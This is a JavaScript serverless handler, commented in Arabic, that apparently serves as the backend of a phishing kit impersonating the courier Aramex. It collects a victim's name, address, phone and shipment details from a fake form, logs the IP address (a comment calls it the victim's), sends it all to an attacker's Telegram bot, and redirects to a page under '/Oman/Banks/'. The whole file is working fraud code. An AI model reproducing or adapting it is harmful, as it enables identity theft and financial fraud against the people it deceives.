const axios = require('axios');

exports.handler = async (event) => {
  // 1. التأكد أن الطلب هو POST
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    // 2. استخراج البيانات من الفورم
    const params = new URLSearchParams(event.body);

    // ربط الحقول (s1, s2...) بمعناها الحقيقي لتظهر واضحة في تليجرام
    const serviceType = params.get('s1') || 'غير محدد';       // نوع الخدمة
    const shipmentNum = params.get('s2') || '-';             // رقم الشحنة
    const fullName    = params.get('s3') || '-';             // الاسم الكامل
    const address     = params.get('s4') || '-';             // العنوان
    const phone       = params.get('s5') || '-';             // رقم الهاتف/المدينة
    const details     = params.get('s6') || 'لا يوجد تفاصيل'; // التفاصيل

    // استخراج IP الضحية
    const userIp = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'Unknown IP';

    const nextPage = '/Oman/Banks/index2.html'; 

    const message = `
📦 **طلب شحن جديد (Aramex)**
---------------------------
🛠 **نوع الخدمة:** ${serviceType}
🔢 **رقم الشحنة:** \`${shipmentNum}\`
👤 **الاسم:** ${fullName}
📍 **العنوان:** ${address}
📱 **الهاتف/المدينة:** ${phone}
📝 **التفاصيل:** ${details}

🌐 **IP:** ${userIp}
---------------------------
    `;

    const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;

    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown' 
      });
    }

    return {
      statusCode: 302,
      headers: {
        'Location': nextPage,
      },
    };

  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 302,
      headers: {
        'Location': '/Oman/Banks/index2.html', 
      },
    };
  }
};